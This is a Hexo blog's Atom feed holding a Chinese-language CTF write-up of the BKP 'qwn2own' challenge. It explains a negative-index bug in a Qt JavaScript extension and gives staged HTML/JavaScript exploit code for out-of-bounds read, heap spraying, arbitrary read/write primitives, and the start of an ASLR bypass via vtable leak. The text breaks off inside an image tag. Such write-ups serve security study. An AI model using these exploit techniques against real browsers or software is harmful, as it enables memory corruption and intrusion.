<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>V4kst1z&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://vsane.github.io/"/>
  <updated>2019-01-27T05:18:56.100Z</updated>
  <id>https://vsane.github.io/</id>
  
  <author>
    <name>V4kst1z</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BKP CTF qwn2own</title>
    <link href="https://vsane.github.io/2019/01/25/qwn2own/"/>
    <id>https://vsane.github.io/2019/01/25/qwn2own/</id>
    <published>2019-01-25T12:50:03.000Z</published>
    <updated>2019-01-27T05:18:56.100Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直在看 <code>webkit</code>，可是一点进展都没有，很多还是看不懂，感觉 <code>webkit</code> 有点复杂， 还是慢慢看吧，自信心都快没了，先入门 <code>Javascriptcore</code> 吧， 先看看相关的题目，后面应该还会有，只是给自己写的笔记，可能太乱。<br><a id="more"></a></p><h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><blockquote><p>The BKP Database JavasScript API allows users to store data that can be kept hidden from other users.<br>This allows web applications to share one web context between multiple users but yet still be able to store<br>sensitive information pertaining to each user and keep it secret from the others.</p></blockquote><p><code>emmm</code> 就是写了个 <code>JS</code> 的扩展。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p><code>BKPStore</code> 中的成员函数 <code>get</code>，<code>remove</code>，<code>cut</code> 的参数都是 <code>int</code> 型，并且在扩展实现中并未对传入的参数进行检验，当传入负数的时候会造成越界操作数据，可是后面发现 <code>get</code> 好像没用，看源码发现是 <code>QVector</code> 的 <code>value</code> 函数将 <code>int</code> 强制转换成了无符号整数。如下<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">Q_OUTOFLINE_TEMPLATE T QVector&lt;T&gt;::value(<span class="keyword">int</span> i) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (uint(i) &gt;= uint(d-&gt;size)) &#123;</span><br><span class="line">        <span class="keyword">return</span> T();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d-&gt;begin()[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面是 <code>BKPStore</code> 类的定义。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BKPStore</span> :</span> <span class="keyword">public</span> QObject &#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BKPStore(QObject * parent = <span class="number">0</span>, <span class="keyword">const</span> QString &amp;name = <span class="number">0</span>, quint8 tp = <span class="number">0</span>, QVariant var = <span class="number">0</span>, qulonglong store_ping = <span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StoreData</span><span class="params">(QVariant v)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Q_INVOKABLE QVariant <span class="title">getall</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">Q_INVOKABLE QVariant <span class="title">get</span><span class="params">(<span class="keyword">int</span> idx)</span></span>;</span><br><span class="line"><span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">insert</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, QVariant var)</span></span>;</span><br><span class="line"><span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">append</span><span class="params">(QVariant var)</span></span>;</span><br><span class="line"><span class="function">Q_INVOKABLE <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> idx)</span></span>;</span><br><span class="line"><span class="function">Q_INVOKABLE <span class="keyword">void</span> <span class="title">cut</span><span class="params">(<span class="keyword">int</span> beg, <span class="keyword">int</span> end)</span></span>;</span><br><span class="line"><span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    quint8 type; <span class="comment">// specifies which type to of vector</span></span><br><span class="line">                  <span class="comment">// to use</span></span><br><span class="line">    QVector&lt;QVariant&gt; varvect;</span><br><span class="line">    QVector&lt;qulonglong&gt; intvect;</span><br><span class="line">    QVector&lt;QString&gt; strvect;</span><br><span class="line">    qulonglong store_ping;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>remove</code> 函数，可以看到并没有对传入的参数检测，<code>cut</code> 函数也是这样，并且都是调用 <code>erase</code> 去删除元素。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> BKPStore::remove(<span class="keyword">int</span> idx)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;varvect.erase(<span class="keyword">this</span>-&gt;varvect.begin() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;intvect.erase(<span class="keyword">this</span>-&gt;intvect.begin() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;strvect.erase(<span class="keyword">this</span>-&gt;strvect.begin() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// this doesn't happen ever</span></span><br><span class="line">        BKPException ex;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面看下 <code>erase</code> 函数的实现，其实实现很简单，如果是静态 <code>Vector</code> 就在逐个删除数组中数据的同时将后面不需要删除的通过 <code>new</code> 重新拷贝过来，如果是非静态就直接通过析构函数删除需要被删除的，后面的直接通过 <code>memmove</code> 函数拷贝过来。可以看到并没有对传入的参数的合法性进行检查。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">typename</span> QVector&lt;T&gt;::iterator QVector&lt;T&gt;::erase(iterator abegin, iterator aend)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> itemsToErase = aend - abegin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!itemsToErase)</span><br><span class="line">        <span class="keyword">return</span> abegin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> itemsUntouched = abegin - d-&gt;begin();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;alloc) &#123;</span><br><span class="line">        detach();</span><br><span class="line">        abegin = d-&gt;begin() + itemsUntouched;</span><br><span class="line">        aend = abegin + itemsToErase;</span><br><span class="line">        <span class="keyword">if</span> (QTypeInfo&lt;T&gt;::isStatic) &#123;</span><br><span class="line">            iterator moveBegin = abegin + itemsToErase;</span><br><span class="line">            iterator moveEnd = d-&gt;end();</span><br><span class="line">            <span class="keyword">while</span> (moveBegin != moveEnd) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QTypeInfo&lt;T&gt;::isComplex)</span><br><span class="line">                    <span class="keyword">static_cast</span>&lt;T *&gt;(abegin)-&gt;~T();</span><br><span class="line">                <span class="keyword">new</span> (abegin++) T(*moveBegin++);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (abegin &lt; d-&gt;end()) &#123;</span><br><span class="line">                <span class="comment">// destroy rest of instances</span></span><br><span class="line">                destruct(abegin, d-&gt;end());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            destruct(abegin, aend);</span><br><span class="line">            memmove(abegin, aend, (d-&gt;size - itemsToErase - itemsUntouched) * <span class="keyword">sizeof</span>(T));</span><br><span class="line">        &#125;</span><br><span class="line">        d-&gt;size -= itemsToErase;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d-&gt;begin() + itemsUntouched;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="Partial-OOB-read"><a href="#Partial-OOB-read" class="headerlink" title="Partial OOB read"></a>Partial OOB read</h3><p>当 <code>remove</code> 中传入的参数为负数时，会将负数位置处的数据删除，在将之后的数据拷贝过来，所以会将数据前的内存破坏。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inline iterator erase(iterator pos) &#123; return erase(pos, pos+1); &#125;</span><br></pre></td></tr></table></figure></p><p>下面是 <code>QArrayData</code> 的定义<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Q_CORE_EXPORT</span> <span class="title">QArrayData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QtPrivate::RefCount ref;    <span class="comment">//引用计数</span></span><br><span class="line">    <span class="keyword">int</span> size;                   <span class="comment">//数组大小</span></span><br><span class="line">    uint alloc : <span class="number">31</span>;            <span class="comment">//占了31位</span></span><br><span class="line">    uint capacityReserved : <span class="number">1</span>;  <span class="comment">//占了1位</span></span><br><span class="line"></span><br><span class="line">    qptrdiff offset; <span class="comment">// in bytes from beginning of header 从 Array 开始到数据的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> *<span class="title">data</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Q_ASSERT(size == <span class="number">0</span></span><br><span class="line">                || offset &lt; <span class="number">0</span> || <span class="keyword">size_t</span>(offset) &gt;= <span class="keyword">sizeof</span>(QArrayData));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span> *&gt;(<span class="keyword">this</span>) + offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="keyword">void</span> *<span class="title">data</span><span class="params">()</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Q_ASSERT(size == <span class="number">0</span></span><br><span class="line">                || offset &lt; <span class="number">0</span> || <span class="keyword">size_t</span>(offset) &gt;= <span class="keyword">sizeof</span>(QArrayData));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;(<span class="keyword">this</span>) + offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>可以看到通过 <code>remove(-1)</code> 就可以改写 <code>offset</code> 来越界读取 <code>Array</code> 结构信息。如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>qwn2own<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"v4kst1z"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      var db = BKPDataBase.create("v4kst1z", "v4kst1z");</span></span><br><span class="line"><span class="undefined">      store = db.createStore("A", 1, [0, 1, 2, 3, 4, 5, 6], 0xaabb);</span></span><br><span class="line"><span class="undefined">      store.remove(-1);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      var info = "";</span></span><br><span class="line"><span class="undefined">      for (var i=0;i&lt;6;i++) &#123;</span></span><br><span class="line"><span class="xml">         info  = info + i + " : " + store.get(i).toString(16) + "<span class="tag">&lt;<span class="name">br</span>&gt;</span>";</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">      document.getElementById("v4kst1z").innerHTML = info;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/dane909/5p16mzx3nhurqxehguq53zch/Snipaste_2019-01-25_20-10-44.png" alt="Snipaste_2019-01-25_20-10-44.png-44.9kB"></p><h3 id="Arbitrary-R-W"><a href="#Arbitrary-R-W" class="headerlink" title="Arbitrary R/W"></a>Arbitrary R/W</h3><p>在 <code>QArrayData</code> 中的 <code>size</code> 变量指定了数组的大小，如果修改 <code>size</code> 的大小，便可以绕过读写时对大小的限制。为了达到任意读写，可以通过变量 <code>store_ping</code> 来标记另外一个数组，方便通过标记来获得另一个 <code>store</code> 中的 <code>intvect</code> 地址，方便后面通过修改另外一个数组的 <code>offset</code> 来达到任意读写。其实这些都在系统的 <code>heap</code> 中，如果只设置一个 <code>store</code>，因为 <code>store</code> 是在之前已经在堆上创建了，所以遍历到的可能性非常小，建立两个 <code>store</code> 会很方便。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>qwn2own<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"v4kst1z"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      var db = BKPDataBase.create("v4kst1z", "v4kst1z");</span></span><br><span class="line"><span class="undefined">      store1 = db.createStore("A", 1, [0, 1, 2, 3, 4, 5, 6], 0xaabb);</span></span><br><span class="line"><span class="undefined">      store2 = db.createStore("B", 1, [0, 1, 2, 3, 4, 5, 6], 0xccddee);</span></span><br><span class="line"><span class="undefined">      store1.remove(-1);</span></span><br><span class="line"><span class="undefined">      store1.insert(0, 0xffffffff00000001);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      var idx = -1;</span></span><br><span class="line"><span class="undefined">      for(i = 0; i &lt; 0x100; i++) &#123;</span></span><br><span class="line"><span class="undefined">         x = store1.get(i);</span></span><br><span class="line"><span class="undefined">         if (x == 0xccddee &amp;&amp; (store1.get(i-1) == store1.get(i-3))) &#123;</span></span><br><span class="line"><span class="undefined">            //strvect 和 varvect 在内存中的值相同</span></span><br><span class="line"><span class="undefined">            idx = i;</span></span><br><span class="line"><span class="undefined">            break;</span></span><br><span class="line"><span class="undefined">         &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      if (idx == -1) &#123;</span></span><br><span class="line"><span class="undefined">         alert("Not found, reloading...");</span></span><br><span class="line"><span class="undefined">         document.location = window.location.href;</span></span><br><span class="line"><span class="undefined">      &#125; else &#123;</span></span><br><span class="line"><span class="undefined">         document.getElementById("v4kst1z").innerHTML = "Found at idx " + i;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>需要注意的是应该在用于利用的数组前创建大量数组，使后面创建的堆前后相邻，利用更时稳定，其实就是堆喷射，如果不这样做在调用读函数的时候会造成只有很小的概率成功，还是无法解释为什么如果不创建有时候没法修改 <code>offset</code>。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>qwn2own<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"v4kst1z"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      function read(addr) &#123;</span></span><br><span class="line"><span class="undefined">         var offset = addr - B_vec;</span></span><br><span class="line"><span class="undefined">         store1.insert(A2B_off_idx, offset);</span></span><br><span class="line"><span class="undefined">         var x = store2.get(0);</span></span><br><span class="line"><span class="undefined">         return x;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      function write(addr, content) &#123;</span></span><br><span class="line"><span class="undefined">         var offset = addr - B_vec;</span></span><br><span class="line"><span class="undefined">         store1.insert(A2B_off_idx, offset);</span></span><br><span class="line"><span class="undefined">         var x = store2.insert(0, content);</span></span><br><span class="line"><span class="undefined">         return x;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      var db = BKPDataBase.create("v4kst1z", "v4kst1z");</span></span><br><span class="line"><span class="undefined">      v4kst1z = new Array(200);</span></span><br><span class="line"><span class="undefined">      for (var i =0;i&lt;200;i++)</span></span><br><span class="line"><span class="undefined">         v4kst1z[i] = db.createStore(i.toString(16), 1, [0, 1, 2, 3, 4, 5，6], 1234);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      store1 = db.createStore("A", 1, [0, 1, 2, 3, 4, 5, 6], 0xaabbcc);</span></span><br><span class="line"><span class="undefined">      store2 = db.createStore("B", 1, [0xaa0321, 0x12345df, 2, 3, 4, 5, 6], 0xccddee);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      store1.remove(-1);</span></span><br><span class="line"><span class="undefined">      store1.insert(0, 0xfffff00000001);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      //后面任意读写需要修改size和offset</span></span><br><span class="line"><span class="undefined">      //store2.remove(-1);  其实不用改size 就注释了 之前想错了</span></span><br><span class="line"><span class="undefined">      //store2.insert(0, 0xfffff00000001);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      var idx = -1;</span></span><br><span class="line"><span class="undefined">      B_vec = -1;</span></span><br><span class="line"><span class="undefined">      var A_vec = -1;</span></span><br><span class="line"><span class="undefined">      A2B_off_idx = - 1 ;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      for (i=0;i&lt;0x2000;i++) &#123;</span></span><br><span class="line"><span class="undefined">         x = store1.get(i);</span></span><br><span class="line"><span class="undefined">         if (x == 0xccddee &amp;&amp; (store1.get(i-1) == store1.get(i-3))) &#123;</span></span><br><span class="line"><span class="undefined">             //strvect 和 varvect 在内存中的值相同</span></span><br><span class="line"><span class="undefined">            idx = i;</span></span><br><span class="line"><span class="undefined">            B_vec = store1.get(i-2);</span></span><br><span class="line"><span class="undefined">            info = "";</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">            for(i = i - 6; i &lt; idx + 6; i++) &#123;</span></span><br><span class="line"><span class="undefined">                if(i == idx - 2)</span></span><br><span class="line"><span class="xml">                        B_vec_addr =   "[*] Found vector2 addr: " + store1.get(i).toString(16) + "<span class="tag">&lt;<span class="name">br</span>&gt;</span>";</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">            if(B_vec == -1) continue;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">            info = info + B_vec_addr;</span></span><br><span class="line"><span class="undefined">            i = idx;</span></span><br><span class="line"><span class="undefined">            while (i++) &#123;</span></span><br><span class="line"><span class="undefined">                if (store1.get(i) == 0xaa0321 &amp;&amp; store1.get(i+1) == 0x12345df) &#123;</span></span><br><span class="line"><span class="undefined">                        A_vec = B_vec - (i-3)*8;</span></span><br><span class="line"><span class="undefined">                        A2B_off_idx = i - 1 ;</span></span><br><span class="line"><span class="xml">                        info = info + "[*] Found vector1 addr: " + A_vec.toString(16) + "<span class="tag">&lt;<span class="name">br</span>&gt;</span>";</span></span><br><span class="line"><span class="undefined">                        break;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">            if(A_vec == -1 || A2B_off_idx == -1) continue;</span></span><br><span class="line"><span class="undefined">            break;</span></span><br><span class="line"><span class="undefined">         &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">      /*</span></span><br><span class="line"><span class="xml">      info = info + "<span class="tag">&lt;<span class="name">br</span>&gt;</span> vector1:";</span></span><br><span class="line"><span class="undefined">      for(i = 0; i &lt; 6; i++)</span></span><br><span class="line"><span class="undefined">                info = info + store1.get(i).toString(16) + " ";</span></span><br><span class="line"><span class="xml">      info = info + "<span class="tag">&lt;<span class="name">br</span>&gt;</span> vector2:";</span></span><br><span class="line"><span class="undefined">      for(i = 0; i &lt; 6; i++)</span></span><br><span class="line"><span class="undefined">                info = info + store2.get(i).toString(16) + " ";</span></span><br><span class="line"><span class="undefined">      */</span></span><br><span class="line"><span class="xml">      info = info + "<span class="tag">&lt;<span class="name">br</span>&gt;</span>A2B_off_idx :" + A2B_off_idx.toString(10) + "<span class="tag">&lt;<span class="name">br</span>&gt;</span>";</span></span><br><span class="line"><span class="undefined">      info = info + read(0x55cf14658000).toString(16);</span></span><br><span class="line"><span class="undefined">      document.getElementById("v4kst1z").innerHTML = info;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/dane909/4trsyq5voqc8mrs22or6pn1p/Snipaste_2019-01-26_12-01-09.png" alt="Snipaste_2019-01-26_12-01-09.png-199.5kB"></p><h3 id="Bypass-ASLR-And-PIE"><a href="#Bypass-ASLR-And-PIE" class="headerlink" title="Bypass ASLR And PIE"></a>Bypass ASLR And PIE</h3><p>前面已经可以达到任意读写，并且也可以知道创建的 <code>BKPStore</code> 对象的信息，可以通过 <code>leak</code> 其 <code>vtable</code> 算出 <code>qwn2own</code> 的加载基址。<br><img src="http://static.zybuluo.com/dane909/sqmmyanuiwur58y97d7lactu/Snipaste_2019-01-27_12-38-40.png" alt="Snipaste_2019-01-27_12-38-40.png-66kB"><br><img src="http://static.zybuluo.com/dane909/o5c2uhrplpvw0s4oqqjk5czo/Snipaste_2019-01-27_12-38-28.png" 